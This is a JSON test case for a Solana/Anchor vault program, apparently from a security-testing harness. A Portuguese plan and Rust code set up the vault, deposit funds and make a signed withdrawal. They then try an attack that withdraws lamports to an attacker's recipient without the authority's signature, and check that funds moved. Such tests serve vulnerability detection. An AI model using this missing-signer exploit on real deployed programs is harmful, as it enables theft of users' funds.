{
  "plan": "Preparamos o vault via initialize (PDA com seeds [b"vault", authority.key()]) e depositamos lamports com um depositor legítimo. O uso legítimo de withdraw é feito com a authority assinando. No ataque, chamamos withdraw com a mesma authority correta, mas sem marcá-la como signer, e um recipient controlado pelo atacante. Medimos o dano verificando que os lamports do vault diminuíram e os do recipient aumentaram, apesar da ausência de assinatura da authority.",
  "scenario": "let authority = Pubkey::new_unique();
let depositor = Pubkey::new_unique();
let recipient = Pubkey::new_unique();

let (vault_pda, _bump) = Pubkey::find_program_address(&[b"vault", authority.as_ref()], &env.program_id);

// Baseline 1: initialize
let ix_init = env.anchor_ix(
    "initialize",
    &(),
    vec![
        AccountMeta::new(vault_pda, false),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(anchor_lang::solana_program::system_program::ID, false),
    ],
);
let mut contas_init = vec![
    (vault_pda, empty_account()),
    (authority, wallet(1_000_000_000)),
    system_program_account(),
];
let r_init = env.baseline("initialize vault", &ix_init, &contas_init);
assert!(r_init.program_result == ProgramResult::Success);

// Baseline 2: deposit
let ix_dep = env.anchor_ix(
    "deposit",
    &(500_000u64),
    vec![
        AccountMeta::new(vault_pda, false),
        AccountMeta::new(depositor, true),
        AccountMeta::new_readonly(anchor_lang::solana_program::system_program::ID, false),
    ],
);
let mut contas_dep = vec![
    (vault_pda, after(&r_init, &vault_pda).clone()),
    (depositor, wallet(1_000_000_000)),
    system_program_account(),
];
let r_dep = env.baseline("deposit into vault", &ix_dep, &contas_dep);
assert!(r_dep.program_result == ProgramResult::Success);

// Baseline 3: withdraw legitimo (authority assina)
let ix_wd_legit = env.anchor_ix(
    "withdraw",
    &(100_000u64),
    vec![
        AccountMeta::new(vault_pda, false),
        AccountMeta::new_readonly(authority, true),
        AccountMeta::new(recipient, false),
    ],
);
let mut contas_wd_legit = vec![
    (vault_pda, after(&r_dep, &vault_pda).clone()),
    (authority, wallet(1_000_000_000)),
    (recipient, wallet(1_000_000_000)),
];
let r_wd_legit = env.baseline("withdraw legitimo com assinatura", &ix_wd_legit, &contas_wd_legit);
assert!(r_wd_legit.program_result == ProgramResult::Success);

// Ataque: withdraw sem a assinatura da authority
let ix_attack = env.anchor_ix(
    "withdraw",
    &(100_000u64),
    vec![
        AccountMeta::new(vault_pda, false),
        AccountMeta::new_readonly(authority, false), // NAO assina
        AccountMeta::new(recipient, false),
    ],
);
let contas_attack = vec![
    (vault_pda, after(&r_wd_legit, &vault_pda).clone()),
    (authority, wallet(1_000_000_000)),
    (recipient, wallet(1_000_000_000)),
];
let r_attack = env.attack("withdraw sem assinatura da authority", &ix_attack, &contas_attack);

if r_attack.program_result == ProgramResult::Success {
    let vault_lamports_antes = after(&r_wd_legit, &vault_pda).lamports();
    let vault_lamports_depois = after(&r_attack, &vault_pda).lamports();
    let recipient_lamports_antes = after(&r_wd_legit, &recipient).lamports();
    let recipient_lamports_depois = after(&r_attack, &recipient).lamports();
    env.effect(
        "vault perdeu lamports sem assinatura da authority",
        vault_lamports_depois < vault_lamports_antes,
    );
    env.effect(
        "recipient ganhou lamports sem assinatura da authority",
        recipient_lamports_depois > recipient_lamports_antes,
    );
}"
}

